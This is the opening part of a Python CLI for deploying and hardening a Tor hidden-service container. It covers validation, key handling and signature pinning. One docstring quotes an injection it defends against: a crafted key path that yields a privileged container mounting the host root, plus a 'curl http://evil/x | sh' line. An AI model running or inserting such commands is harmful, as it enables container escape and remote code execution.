#!/usr/bin/env python3
"""hiddenforge - operator CLI and machine contract for the hiddenforge image.

Runs ON YOUR HOST (or standalone from a download). Stdlib only, no pip install.

Subcommands:
    setup        Emit a ready-to-merge compose fragment + deploy.sh + README.txt
    info         Print the machine contract (manifest.json)
    version      Print name, version and contract version
    show         Print the .onion address(es) in the key volume
    status       Report container/Tor/hidden-service readiness
    doctor       Verify the hardening of the running container and the keys
    vanity       Brute-force a vanity .onion prefix (runs in the image)
    backup       Encrypted offline backup of the key volume
    restore      Restore a previous backup
    rotate       DESTRUCTIVE: archive the current identity and start over
    encrypt-key  Encrypt a service key directory at rest (age/gpg), offline
    decrypt-key  Reverse of encrypt-key
    verify-image Verify the signed image digest (ssh-fido2 + ML-DSA)
    sbom         Generate an SPDX SBOM for an image

Machine contract (stable): every command that matters supports --json, prints
exactly one JSON document on stdout, sends narration to stderr, never prompts
off a TTY, and uses the exit codes in manifest.json.
"""
from __future__ import annotations

import argparse
import base64
import errno
import hashlib
import ipaddress
import json
import os
import re
import secrets
import shlex
import shutil
import stat
import subprocess
import sys
import tarfile
import tempfile
import time
from pathlib import Path
import contextlib

# ---------------------------------------------------------------------------
# Constants (single source of truth for the CLI; manifest.json mirrors this and
# tests/test_manifest.py asserts they agree).
# ---------------------------------------------------------------------------

HIDDENFORGE_VERSION = "2.1.0"
CONTRACT_VERSION = 1
DEFAULT_IMAGE = os.environ.get("HIDDENFORGE_IMAGE", "sambent.dev/sam/hiddenforge:latest")
DEFAULT_IMAGE_REPOSITORY = "sambent.dev/sam/hiddenforge"
DEFAULT_CONTAINER = "tor"
DEFAULT_NAME = "myapp"
DEFAULT_KEYS = "./tor-keys"
TOR_VERSION = "0.4.9.13"
DEFAULT_SIGNATURE_DIR = "signatures"
SIGNED_DIGEST_FILE = "hiddenforge.digest"
DEFAULT_SIGN_IDENTITY = "sam@sambent.com"
# The trust anchor for `verify-image`, pinned in the verifier rather than read
# from the signature directory it is verifying.
#
# It used to be read from `<sigdir>/allowed-signers`, which made the check
# circular: whoever could alter the signature directory could put their own key
# in it, sign their own digest, and get `ssh_fido2: true` and exit 0. Measured
# with a plain software ed25519 key labelled sam@sambent.com. The keys below are
# the two hardware-backed (sk-) keys that have signed releases; rotating one is a
# release of this CLI, which is exactly where a key change belongs.
PINNED_ALLOWED_SIGNERS = (
    "sam@sambent.com sk-ssh-ed25519@openssh.com "
    "AAAAGnNrLXNzaC1lZDI1NTE5QG9wZW5zc2guY29tAAAAIFQ5cGRalEe5f4+/rtOrQZnfLT2sEpnuNj"
    "ztb4oVd0tgAAAAD3NzaDpoaWRkZW5mb3JnZQ== hiddenforge@Optimus",
    "sam@sambent.com sk-ssh-ed25519@openssh.com "
    "AAAAGnNrLXNzaC1lZDI1NTE5QG9wZW5zc2guY29tAAAAINolkpx1Nf22KT7i8mTisKmIox6JoJlyxV"
    "ZrEnVV1zGMAAAAH3NzaDpyZWxlYXNlLXNpZ25pbmdAc2FtYmVudC5kZXY= sambent release signing",
)
# SHA-256 of the ML-DSA-65 public key, signatures/sambent-mldsa.pub. The key is
# ~2 KB, so the hash is pinned and the bytes are taken from the signature set
# only if they hash to this.
PINNED_MLDSA_PUB_SHA256 = "4ae873ade7ee596c815f55f3052c0f01020b1817f86eaf15ab67c8fc77cbfd22"
# anchore/syft pinned by digest (no mutable tag), resolved from the registry.
SYFT_IMAGE = ("anchore/syft@sha256:"
              "95fe0835e5bebc6f8b1f8acef68d47d63d594ef4c0f25c097ff853b23cbac74c")

EXIT_OK = 0
EXIT_FAIL = 1
EXIT_USAGE = 2
EXIT_RACE = 3
EXIT_NOT_READY = 4
EXIT_ABORTED = 130

EXIT_CODES = {
    "0": "success",
    "1": "refused or failed (see stderr / the --json error field)",
    "2": "usage, validation, or environment error",
    "3": "a key appeared at the output path while a search was running",
    "4": "not ready yet (status --json: the hidden service is not published)",
    "130": "aborted at a prompt",
}

# Tor v3 on-disk layout.
SECRET_FILE = "hs_ed25519_secret_key"
PUBLIC_FILE = "hs_ed25519_public_key"
HOSTNAME_FILE = "hostname"
PUBLIC_TAG = b"== ed25519v1-public: type0 =="
SECRET_TAG = b"== ed25519v1-secret: type0 =="
TAG_LEN = 32
PUBKEY_LEN = 32
SECRET_KEY_FILE_LEN = TAG_LEN + 64   # tag + 64-byte expanded Ed25519 secret

NAME_RE = re.compile(r"^[a-z0-9][a-z0-9\-]{0,62}$")
ONION_RE = re.compile(r"^[a-z2-7]{56}\.onion$")
PREFIX_RE = re.compile(r"^[a-z2-7]{1,12}$")
CONTAINER_RE = re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9_.\-]*$")
# A container image reference that is safe to place in an argv or in YAML:
# starts alphanumeric (never '-', which docker would parse as a flag) and
# contains no whitespace or newline (which would inject YAML keys).
IMAGE_REF_RE = re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9._/:@-]{0,254}$")
HSDIR_RE = re.compile(r"^\s*HiddenServiceDir\s+(\S+)\s*$")
TORRC_PATH = "/etc/tor/torrc"
HF_IN_IMAGE = "/usr/local/bin/hiddenforge"
KEYS_IN_IMAGE = "/var/lib/tor/hidden_service"

# Directives every generated torrc must contain. Kept here so the emitter, the
# tests and `doctor` agree. The authoritative generator is entrypoint.py; this
# is the CLI-side copy used only for documentation/verification messages.
HARDENING_DIRECTIVES = (
    "ClientOnly 1",
    "ExitPolicy reject *:*",
    "SafeLogging 1",
    "AvoidDiskWrites 1",
    "DisableDebuggerAttachment 1",
    "FetchUselessDescriptors 0",
    "VanguardsLiteEnabled 1",
    "HiddenServicePoWDefensesEnabled 1",
    "HiddenServiceEnableIntroDoSDefense 1",
    "HiddenServiceVersion 3",
)

# The most cap_add the image ever needs, and the ceiling `doctor` measures
# "stays within the allowed set" against.
REQUIRED_CAP_ADD = {"CHOWN", "DAC_OVERRIDE", "FOWNER", "SETUID", "SETGID"}
# What it needs under ROOTLESS Podman, which is fewer. Container root maps to the
# invoking host user there, so the bind-mounted key volume is already writable and
# neither DAC_OVERRIDE nor FOWNER is required -- which is exactly what
# podman-compose.yml grants, with that reasoning written beside it.
#
# `doctor` used to demand all five on every runtime, so it reported FAILED for a
# container started from this project's own podman compose file, on the runtime
# the deployed instance actually uses. A check that fails on the recommended
# configuration teaches operators to ignore it, which is worse than not checking.
ROOTLESS_REQUIRED_CAP_ADD = {"CHOWN", "SETUID", "SETGID"}


# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------

def _eprint(*a, **kw):
    print(*a, file=sys.stderr, **kw)


def emit_json(rc: int, **fields) -> int:
    """Emit exactly one JSON document on stdout.

    Null values are kept, not dropped: a consumer polling for an address must be
    able to distinguish "no address yet" (onion: null) from "field absent".
    """
    doc = {"ok": rc == 0, "exit_code": rc}
    doc.update(fields)
    print(json.dumps(doc, sort_keys=True))
    return rc


def _narrate(args, message: str) -> None:
    """Human narration; in --json mode goes to stderr so stdout stays one doc."""
    if getattr(args, "json", False):
        _eprint(message)
    else:
        print(message)


def _default_keys() -> Path:
    return Path(os.environ.get("HIDDENFORGE_KEYS_DIR", DEFAULT_KEYS))


def validate_name(name: str) -> str:
    if not NAME_RE.fullmatch(name):
        raise ValueError(
            f"invalid service name {name!r}: lowercase letters, digits and hyphens "
            "only, must start alphanumeric, max 63 chars (it becomes a directory "
            "under the key volume)"
        )
    if name in (".", "..") or "/" in name or "\x00" in name:
        raise ValueError(f"invalid service name {name!r}")
    return name


def validate_container(name: str) -> str:
    if not CONTAINER_RE.fullmatch(name):
        raise ValueError(f"invalid container name {name!r}")
    return name


def validate_keys_dir(value: str) -> str:
    """The key-volume path, on its way into a generated compose file and shell script.

    `--image` and `--container` were validated and this was not, which is the whole
    bug: `setup` interpolates the path into `compose.service.yml` and into a 0755
    `deploy.sh` that the README tells the operator to run. Reproduced before this
    was written -- a crafted value produced a fragment with

        privileged: true
        volumes: ['/tmp/keys:/var/lib/tor/hidden_service', '/:/host']

    which is a container escape written into a file the operator merges with
    `docker compose -f their.yml -f compose.service.yml up -d`, and a deploy.sh
    containing `curl http://evil/x | sh`.

    The generators now quote the value properly for each destination, which is the
    real fix. This is the second half: a path carrying a newline, a NUL or any
    other control character is not a path anyone meant to type, and refusing it
    keeps the generated files readable as well as safe.
    """
    if not value or len(value) > 4096:
        raise ValueError("key directory path must be 1-4096 characters")
    bad = [c for c in value if ord(c) < 0x20 or ord(c) == 0x7F]
    if bad:
        raise ValueError(
            f"key directory path contains a control character ({bad[0]!r}); it is "
            "written into a compose file and a shell script")
    return value


def validate_image_ref(value: str) -> str:
    """Validate a container image reference before it reaches argv or YAML.

    The CLI hands ``--image``/``--syft-image`` to ``docker run`` as an argv
    element: a value beginning with ``-`` (e.g. ``--privileged``) would be
    parsed by docker as a FLAG rather than the image, and a value containing a
    newline would inject keys into the generated ``compose.service.yml``. Both
    are rejected here.
    """
    if not IMAGE_REF_RE.fullmatch(value or ""):
        raise ValueError(
            f"invalid image reference {value!r}: expected registry/name[:tag]"
            "[@sha256:...] with no spaces, newlines, or leading '-'"
        )
    return value


def derive_onion(pubkey: bytes) -> str:
    if len(pubkey) != PUBKEY_LEN:
        raise ValueError(f"public key must be {PUBKEY_LEN} bytes")
    checksum = hashlib.sha3_256(b".onion checksum" + pubkey + b"\x03").digest()[:2]
    return base64.b32encode(pubkey + checksum + b"\x03").decode("ascii").lower() + ".onion"


def _read_nofollow(path: Path, max_bytes: int = 8192) -> bytes:
    """Read a regular file, refusing to follow a final-component symlink."""
    # O_NONBLOCK: opening a FIFO planted at this path would otherwise block for
    # ever before the regular-file check below could refuse it.
    fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW | os.O_NONBLOCK)
    try:
        st = os.fstat(fd)
        if not stat.S_ISREG(st.st_mode):
            raise OSError(f"{path} is not a regular file")
        if st.st_size > max_bytes:
            raise OSError(f"{path} is unexpectedly large ({st.st_size} bytes)")
        data = b""
        while len(data) < st.st_size:
            chunk = os.read(fd, st.st_size - len(data))
            if not chunk:
                break
            data += chunk
        return data
    finally:
        os.close(fd)


def _write_text_nofollow(path: Path, text: str, mode: int = 0o644) -> None:
    """Write a file without ever opening an inode that already exists.

    The file is written to a fresh temp created with O_EXCL beside it and renamed
    over the target, so nothing that sits at the path is written through: not a
    symlink (whose target used to be truncated before O_NOFOLLOW was added), and
    not a HARDLINK, which O_NOFOLLOW never stopped -- `setup --force` over a
    `deploy.sh` hard-linked to another file wrote the script into that file and
    made it 0755. A symlink, FIFO or directory at the path is still refused
    outright rather than silently replaced: something planted there is worth
    saying out loud. The mode is set with fchmod on the descriptor, so the umask
    cannot narrow it.
    """
    try:
        st = os.lstat(path)
    except FileNotFoundError:
        pass
    else:
        if not stat.S_ISREG(st.st_mode):
            raise OSError(errno.EEXIST, f"refusing to replace {path}: it is not a "
                                        "regular file")
    tmp = path.with_name(f".{path.name}.{secrets.token_hex(8)}.tmp")
    fd = os.open(tmp, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_NOFOLLOW, mode)
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            fh.write(text)
            fh.flush()
            os.fchmod(fh.fileno(), mode)
        os.replace(tmp, path)
    except BaseException:
        with contextlib.suppress(OSError):
            os.unlink(tmp)
        raise


def read_pubkey(path: Path) -> bytes:
    data = _read_nofollow(path)
    if len(data) == TAG_LEN + PUBKEY_LEN and data.startswith(PUBLIC_TAG):
        return data[TAG_LEN:]
    if len(data) == PUBKEY_LEN:
        return data
    raise ValueError(f"{path.name}: bad public key length {len(data)}")


def read_onion_file(path: Path) -> str | None:
    try:
        text = _read_nofollow(path, 256).decode("ascii").strip()
    except (OSError, UnicodeDecodeError):
        return None
    return text if ONION_RE.fullmatch(text) else None


def address_for(keys: Path, name: str) -> dict:
    """Resolve one service's address without ever reading the secret key."""
    validate_name(name)
    d = keys / name
    published_path = keys / f"{name}.onion"
    onion = read_onion_file(d / HOSTNAME_FILE)
    source: str | None = "hostname"
    if onion is None:
        onion = read_onion_file(published_path)
        source = "published"
    derived: str | None = None
    try:
        derived = derive_onion(read_pubkey(d / PUBLIC_FILE))
    except (OSError, ValueError):
        derived = None
    if onion is None:
        onion, source = (derived, "derived") if derived else (None, None)
    # Do the two agree? The public key IS the address, so when a hostname file
    # says something else the key set is inconsistent -- a partial restore, or
    # files from two different services in one directory. Tor rewrites `hostname`
    # from the key at startup, so it would serve the DERIVED address while the
    # operator publishes the one `show` reported. This project has already been
    # bitten once by reporting an address nothing could reach; reporting one the
    # container will not serve is the same mistake in a different place.
    #
    # Additive: `onion` and `source` are unchanged, so the documented contract
    # still holds, and None means "could not tell" rather than "fine".
    derived_matches = None if derived is None or onion is None else derived == onion
    # A disagreement is not reported as an address at all. Measured: Tor rewrites
    # `hostname` from the key when it starts, so the key's address is the one
    # served and the file's is the one that is wrong. `show` used to print the
    # file's with exit 0, which is exactly the address an operator would then
    # publish. Both are kept under their own names so the fault can be diagnosed.
    extra: dict = {}
    if derived_matches is False:
        extra = {"hostname_onion": onion, "derived_onion": derived}
        onion, source = None, "inconsistent"
    return {
        "name": name,
        "onion": onion,
        "source": source,
        "derived_matches": derived_matches,
        **extra,
        "key_path": str(d / SECRET_FILE),
        "public_key_path": str(d / PUBLIC_FILE),
        "address_path": str(published_path),
        "key_dir": str(d),
    }


def _torrc_service_names(keys: Path) -> list[str]:
    """Service names from the running torrc (in-container fallback).

    Needed because the key volume is 0751 (traverse, not list), so neither the
    host user nor the tor user can enumerate it. The torrc is readable and names
    every HiddenServiceDir; on the host the file does not exist, so this returns
    [] and normal listing/inspection applies.
    """
    try:
        text = Path(TORRC_PATH).read_text(encoding="utf-8", errors="replace")
    except OSError:
        return []
    names: list[str] = []
    for line in text.splitlines():
        m = HSDIR_RE.match(line)
        if not m:
            continue
        d = Path(m.group(1))
        if ((str(d.parent) == str(keys) or d.parent == keys)
                and NAME_RE.fullmatch(d.name) and d.name not in names):
            names.append(d.name)
    return names


def service_names(keys: Path) -> list[str]:
    """Service directory names, or [] if the key volume is not listable.

    The entrypoint sets the key volume to 0751 (traverse, not list) so a local
    non-owner cannot enumerate which services exist. That is deliberate, so
    listing is best-effort: if the directory cannot be listed, fall back to the
    torrc (in-container) and otherwise return [].
    """
    if not keys.is_dir():
        return []
    try:
        entries = list(keys.iterdir())
    except PermissionError:
        return _torrc_service_names(keys)
    names = []
    for p in sorted(entries):
        if p.is_symlink() or not p.is_dir():
            continue
        if NAME_RE.fullmatch(p.name):
            names.append(p.name)
    return names


def _run(cmd: list[str], **kw) -> subprocess.CompletedProcess:
    """Run a command with a bounded timeout, always returning a CompletedProcess.

    A hung docker/skopeo/syft call must not hang the CLI forever; on timeout we
    return rc 124 with a marker in stderr, which the callers already treat as
    failure (they check returncode and surface stderr).
    """
    kw.setdefault("capture_output", True)
    kw.setdefault("text", True)
    check = kw.pop("check", False)
    timeout = kw.pop("timeout", 600)
    try:
        return subprocess.run(cmd, timeout=timeout, check=check, **kw)
    except subprocess.TimeoutExpired as exc:
        out = (exc.stdout if isinstance(exc.stdout, str)
               else (exc.stdout or b"").decode(errors="replace"))
        err = (exc.stderr if isinstance(exc.stderr, str)
               else (exc.stderr or b"").decode(errors="replace"))
        return subprocess.CompletedProcess(cmd, 124, out, err + f" (timed out after {timeout}s)")


def _engine() -> str | None:
    """Container engine to use: docker, else podman, else None.

    Override with HIDDENFORGE_ENGINE. Everything that shells out (inspect, exec,
    run) goes through this so a Podman-only host is a first-class citizen.
    """
    override = os.environ.get("HIDDENFORGE_ENGINE")
    if override in ("docker", "podman"):
        return override
    if shutil.which("docker"):
        return "docker"
    if shutil.which("podman"):
        return "podman"
    return None


# ---------------------------------------------------------------------------
# manifest / info / version
